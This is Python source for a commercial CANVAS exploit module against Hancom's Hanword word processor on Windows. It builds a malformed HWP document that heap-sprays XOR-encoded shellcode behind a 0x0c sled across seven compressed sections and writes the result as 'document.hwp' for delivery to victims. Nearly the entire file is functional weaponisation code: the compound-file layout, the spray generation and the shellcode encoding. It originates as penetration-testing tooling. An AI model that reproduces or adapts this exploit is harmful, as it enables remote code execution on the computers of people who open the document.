#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2008
#http://www.immunityinc.com/CANVAS/ for more information

import sys
if '.' not in sys.path: sys.path.append('.')

import os
import getopt
import socket
import time
import struct
import logging

import zlib
from libs.ole import *

from exploitutils import *
from tcpexploit import *
from MOSDEF import mosdef
from httpclientside import httpclientside
from encoder import xorencoder
from libs.ua_parser import user_agent_parser
from shellcode.standalone.windows.payloads import payloads
from encoder.xorencoder import simpleXOR


NAME                                = 'Hanword exec'
DESCRIPTION                         = 'Hanword client side exploit'

DOCUMENTATION                       = {}
DOCUMENTATION['VENDOR']             = "Hancom"
DOCUMENTATION['Date public']        = ''
DOCUMENTATION['References']         = ''
DOCUMENTATION['Repeatability']      = ''
DOCUMENTATION['CVE Name']           = ''
DOCUMENTATION['CVE URL']            = ''
DOCUMENTATION['CVSS']               = 0
DOCUMENTATION["CERT Advisory"]      = ''
DOCUMENTATION['VersionsAffected']   = ''

VERSION                             = '1.0'

PROPERTY                            = {}
PROPERTY['TYPE']                    = 'Exploit'
PROPERTY['SITE']                    = 'Clientside'
PROPERTY['ARCH']                    = [['Windows']]
PROPERTY['VERSION']                 = [ '7' ]
PROPERTY['DELIVERY']                = 'HTTP'

DOCUMENTATION['NOTES']              = """
Target Version: Hanword 2010SE+, Version 8.5.8.1256

The exploit works only in standalone mode at the moment, not from within clientd.
Hanword process will crash after the exploit finishes, though the canvas node will remain alive.

Tested on:
* Tested on Windows 7 Home Basic x86
"""

CHANGELOG = """
"""

targets={
    0: ['Autodetect', 0],
    1: ['Windows', 0x42424242]
}

class HangulDocument():
    def __init__(self, shellcode):
        self.shellcode = shellcode
        self.DEBUG = True
        self.components = []

        self.header = CompoundFileHeader()
        self.fat = FATSector(self.header, 3)

        self.header.num_fat_sect = 3
        self.header.first_dir_sect_location = 3
        self.header.first_mini_fat_loc  = 8
        self.header.num_mini_fat_sect = 1
        self.header.difat[0] = 0x0
        self.header.difat[1] = 0x1
        self.header.difat[2] = 0x2

        self.fill_FAT()
        self.ministreamsgroup = SecuentialMiniStreamSectorGroup(self.header)
        self.minifat = MiniFATSector(self.header)

        self.addDocInfo()
        self.addPrvText()
        self.addDefaultJScript()
        self.addJScriptVersion()
        self.addPrvImage()
        self.addLinkDoc()
        self.addFileHeader()
        self.addHwpSummaryInfo()
        self.addSection0()
        self.add_component(self.header)
        self.add_component(self.fat)

        self.spray_direntries = []
        self.add_dir_components()

        first_mini_fat_loc = self.add_component(self.minifat)
        first_mini_stream_loc = self.add_component(self.ministreamsgroup)

        self.addSpraySections(16)

        #self.minifat.dump()

    def get_num_sectors(self):
        tmp = ""
        for c in self.components:
            tmp += c.get_raw()
        return (len(tmp)/self.header.get_sector_size())-1

    #adds a sector to the document and returns the index
    def add_component(self, sector):
        pos = self.get_num_sectors()
        self.components.append(sector)
        return pos

    def fill_FAT(self):
        # Fat
        self.fat.sector[0] = FATSECT
        self.fat.sector[1] = FATSECT
        self.fat.sector[2] = FATSECT
        self.fat.chain(3,7)        # Directory
        self.fat.chain(8,8)        # MiniFat
        self.fat.chain(9,15)        # MiniStream

    def add_dir_components(self):
        # Sector 1
        dirsector = DirectorySector(self.header)

        #ID 0
        rootEntry = RootDirectoryEntry()
        rootEntry.child_id = 1  # storage 1
        rootEntry.set_CLSID(0x00,0x00,0x00)
        rootEntry.starting_sector_location = 9 # Ministream sector start
        rootEntry.stream_size = len(self.ministreamsgroup.get_raw()) # ministream size
        #rootEntry.stream_size = 0x240 # ministream size
        rootEntry.color = COLOR_BLACK
        dirsector.add_entry(rootEntry)

        #ID 1
        stream = StreamDirectoryEntry("DocInfo")
        stream.set_CLSID(0x00,0x00,0x00)
        stream.stream_size = self.docinfo_size
        stream.color = COLOR_BLACK
        stream.starting_sector_location = self.docinfo_sectn
        stream.right_silving_id = 0x02
        dirsector.add_entry(stream)

        #ID 2
        stream = StreamDirectoryEntry("PrvText")
        stream.set_CLSID(0x00,0x00,0x00)
        stream.stream_size = self.prvtext_size
        stream.color = COLOR_BLACK
        stream.starting_sector_location = self.prvtext_sectn
        stream.right_silving_id = 0x03
        dirsector.add_entry(stream)

        #ID 3
        storage = StorageDirectoryEntry("Scripts")
        storage.child_id = 4
        storage.set_CLSID(0,0,0)
        storage.color = COLOR_BLACK
        storage.right_silving_id = 6
        dirsector.add_entry(storage)

        pos = self.add_component(dirsector)
        #----------------------------------------------------------------------
        # Sector 2
        dirsector = DirectorySector(self.header)

        #ID 4
        stream = StreamDirectoryEntry("DefaultJScript")
        stream.stream_size = self.defaultjs_size
        stream.starting_sector_location = self.defaultjs_sectn
        stream.right_silving_id = 0x05
        dirsector.add_entry(stream)

        #ID 5
        stream = StreamDirectoryEntry("JScriptVersion")
        stream.stream_size = self.jsversion_size
        stream.starting_sector_location = self.jsversion_sectn
        stream.right_silving_id = NOSTREAM
        dirsector.add_entry(stream)

        #ID 6
        storage = StorageDirectoryEntry("BodyText")
        storage.child_id = 7
        storage.right_silving_id = 15
        dirsector.add_entry(storage)

        #ID 7
        stream = StreamDirectoryEntry("Section0")
        stream.stream_size = self.section0_size
        stream.starting_sector_location = self.section0_sectn
        stream.right_silving_id = 8
        dirsector.add_entry(stream)


        pos = self.add_component(dirsector)
        #----------------------------------------------------------------------
        # Sector 3
        dirsector = DirectorySector(self.header)

        #ID 8
        stream = StreamDirectoryEntry("Section1")
        stream.set_CLSID(0x00,0x00,0x00)
        stream.stream_size = 0x0
        stream.color = COLOR_BLACK
        stream.starting_sector_location = 0x0
        stream.right_silving_id = 9
        self.spray_direntries.append(stream)
        dirsector.add_entry(stream)

        #ID 9
        stream = StreamDirectoryEntry("Section2")
        stream.set_CLSID(0x00,0x00,0x00)
        stream.stream_size = 0x0
        stream.color = COLOR_BLACK
        stream.starting_sector_location = 0x0
        stream.right_silving_id = 10
        self.spray_direntries.append(stream)
        dirsector.add_entry(stream)

        #ID 10
        stream = StreamDirectoryEntry("Section3")
        stream.set_CLSID(0x00,0x00,0x00)
        stream.stream_size = 0x0
        stream.color = COLOR_BLACK
        stream.starting_sector_location = 0x0
        stream.right_silving_id = 11
        self.spray_direntries.append(stream)
        dirsector.add_entry(stream)

        #ID 11
        stream = StreamDirectoryEntry("Section4")
        stream.set_CLSID(0x00,0x00,0x00)
        stream.stream_size = 0x0
        stream.color = COLOR_BLACK
        stream.starting_sector_location = 0x0
        stream.right_silving_id = 12
        self.spray_direntries.append(stream)
        dirsector.add_entry(stream)

        pos = self.add_component(dirsector)
        #----------------------------------------------------------------------
        # Sector 4
        dirsector = DirectorySector(self.header)

        #ID 12
        stream = StreamDirectoryEntry("Section5")
        stream.set_CLSID(0x00,0x00,0x00)
        stream.stream_size = 0x0
        stream.color = COLOR_BLACK
        stream.starting_sector_location = 0x0
        stream.right_silving_id = 13
        self.spray_direntries.append(stream)
        dirsector.add_entry(stream)

        #ID 13
        stream = StreamDirectoryEntry("Section6")
        stream.set_CLSID(0x00,0x00,0x00)
        stream.stream_size = 0x0
        stream.color = COLOR_BLACK
        stream.starting_sector_location = 0x0
        stream.right_silving_id = 14
        self.spray_direntries.append(stream)
        dirsector.add_entry(stream)

        #ID 14
        stream = StreamDirectoryEntry("Section7")
        stream.set_CLSID(0x00,0x00,0x00)
        stream.stream_size = 0x0
        stream.color = COLOR_BLACK
        stream.starting_sector_location = 0x0
        stream.right_silving_id = NOSTREAM
        self.spray_direntries.append(stream)
        dirsector.add_entry(stream)

        #ID 15
        stream = StreamDirectoryEntry("PrvImage")
        stream.set_CLSID(0x00,0x00,0x00)
        stream.stream_size = self.prvimg_size
        stream.color = COLOR_BLACK
        stream.starting_sector_location = self.prvimg_sectn
        stream.right_silving_id = 16
        dirsector.add_entry(stream)

        pos = self.add_component(dirsector)
        #----------------------------------------------------------------------
        # Directory, Sector 5
        dirsector = DirectorySector(self.header)

        #ID 16
        storage = StorageDirectoryEntry("DocOptions")
        storage.child_id = 17
        storage.right_silving_id = 18
        dirsector.add_entry(storage)

        #ID 17
        stream = StreamDirectoryEntry("_LinkDoc")
        stream.stream_size = self.linkdoc_size
        stream.starting_sector_location = self.linkdoc_sectn
        stream.right_silving_id = NOSTREAM
        dirsector.add_entry(stream)

        #ID 18
        stream = StreamDirectoryEntry("FileHeader")
        stream.stream_size = self.filehdr_size
        stream.starting_sector_location = self.filehdr_sectn
        stream.right_silving_id = 19
        dirsector.add_entry(stream)

        #ID 19
        stream = StreamDirectoryEntry("\x05HwpSummaryInformation")
        stream.stream_size = self.hwpsumm_size
        stream.starting_sector_location = self.hwpsumm_sectn
        stream.right_silving_id = NOSTREAM
        dirsector.add_entry(stream)

        pos = self.add_component(dirsector)

    def addMinistreamData(self, data):
        start, end = self.ministreamsgroup.add_data(data)
        self.minifat.chain(start, end)
        size = len(data)
        return size, start

    def readFile(self, filename):
        with open(os.path.join(os.path.dirname(__file__), 'Resources', filename), 'rb') as f:
            return f.read()

    def addDocInfo(self):
        data = self.readFile("DocInfo.bin")
        self.docinfo_size, self.docinfo_sectn = self.addMinistreamData(data)

    def addPrvText(self):
        data = self.readFile("PrvText.bin")
        self.prvtext_size, self.prvtext_sectn = self.addMinistreamData(data)

    def addDefaultJScript(self):
        data = self.readFile("DefaultJScript.bin")
        self.defaultjs_size, self.defaultjs_sectn = self.addMinistreamData(data)

    def addJScriptVersion(self):
        data = self.readFile("JScriptVersion.bin")
        self.jsversion_size, self.jsversion_sectn = self.addMinistreamData(data)

    def addPrvImage(self):
        # 1x1 pixel gif should work, and save us some space
        data = "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP4/5+hHgAHfQJ+/bzs7gAAAABJRU5ErkJggg==".decode("base64")
        self.prvimg_size, self.prvimg_sectn = self.addMinistreamData(data)

    def addLinkDoc(self):
        data = self.readFile("LinkDoc.bin")
        self.linkdoc_size, self.linkdoc_sectn = self.addMinistreamData(data)

    def addFileHeader(self):
        data = self.readFile("FileHeader.bin")
        self.filehdr_size, self.filehdr_sectn = self.addMinistreamData(data)

    def addHwpSummaryInfo(self):
        data = self.readFile("HwpSummaryInformation.bin")
        self.hwpsumm_size, self.hwpsumm_sectn = self.addMinistreamData(data)

    def addSection0(self):
        data = self.readFile("Section0.bin")
        self.section0_size, self.section0_sectn = self.addMinistreamData(data)

    # adds data to sectors and chains the fat
    def addStreamData(self, nextfreesect, data):
        stream = StreamSectors(self.header, data)
        self.add_component(stream)
        sector_from = nextfreesect
        sector_to = nextfreesect + stream.get_num_sectors() -1
        self.fat.chain(sector_from, sector_to)
        return sector_from, sector_to

    def compress_raw(self, input):
        return zlib.compress(input)[2:-4]

    def decompress_raw(self, input):
        return zlib.decompress(input, -15)

    def patch_section(self, input, offset, data):
        if len(data)+offset > len(input):
            raise Exception("patch data dont fit")
        output = input[:offset] + data + input[offset+len(data):]
        return output

    def gen_spray_section(self, template_data):
        gap_start = 0x1F6
        gap_end   = 0x1000540
        #nopslead must also be a sprayed address, in this case 0x0c0c0c0c
        nopslead = '\x0c' * ((gap_end-gap_start)-len(self.shellcode))
        newdata = self.patch_section(template_data, gap_start, nopslead+self.shellcode)
        return newdata

    def addSpraySections(self, nextfreesect):
        template_data = self.readFile("spray_template")
        uncompressed_data = self.gen_spray_section(template_data)
        data = self.compress_raw(uncompressed_data)

        for i in range(0,7):
            #data = chr(i+1)*17622
            location, end = self.addStreamData(nextfreesect, data)
            self.spray_direntries[i].stream_size = len(data)
            self.spray_direntries[i].starting_sector_location = location
            nextfreesect = end + 1

    def get_raw(self):
        tmp = ""
        for c in self.components:
            tmp += c.get_raw()
        return tmp


class theexploit(httpclientside):
    def __init__(self):
        httpclientside.__init__(self)
        self.setInfo(DESCRIPTION)
        self.clientversion = 1
        self.badstring = '\0'
        self.name = NAME
        self.dest_file = 'document.hwp'
        return

    def is_vulnerable( self, info_dict ):
        parsed = user_agent_parser.Parse(info_dict['user_agent'])
        if 'Windows' not in parsed['os']['family']:
            return 0

        return 1

    def createShellcode(self):
        self.createWin32ClientSideShellcode()

        encoder = simpleXOR(key=0x3a)
        encoder.setbadstring(self.badstring)
        #self.shellcode = "\xcc" + encoder.encode(self.shellcode) + "\xcc"
        self.shellcode = encoder.encode(self.shellcode)

    def makeHWP(self):
        doc = HangulDocument(self.shellcode)
        #doc = HangulDocument(self.createShellcode())
        return doc.get_raw()

    #TODO implement or remove
    def makesploit(self,clientheader,clientbody):
        from libs.spkproxy import header,body
        h=header('SERVER')
        b=body()
        return h,b

    def getArgs(self):
        self.host=self.target.interface
        self.dest_file=self.argsDict.get('dest_filename', self.dest_file)
        return

    def displayVersions(self):
        for t in targets.keys():
            logging.info('Version %d: %s' % (t, targets[t][0]))
        return

    def run(self):
        self.getArgs()
        self.filedata=self.makeHWP()
        logging.info('Opening %s for output'%(self.dest_file))
        fd=file(self.dest_file,'wb+')
        fd.write(self.filedata)
        fd.close()
        logging.info('Wrote to %s'%(self.dest_file))
        return 1

if __name__=='__main__':
    print 'Running CANVAS %s Exploit v %s'%(DESCRIPTION,VERSION)
    app=theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [0,1,None]:
        ret.interact()
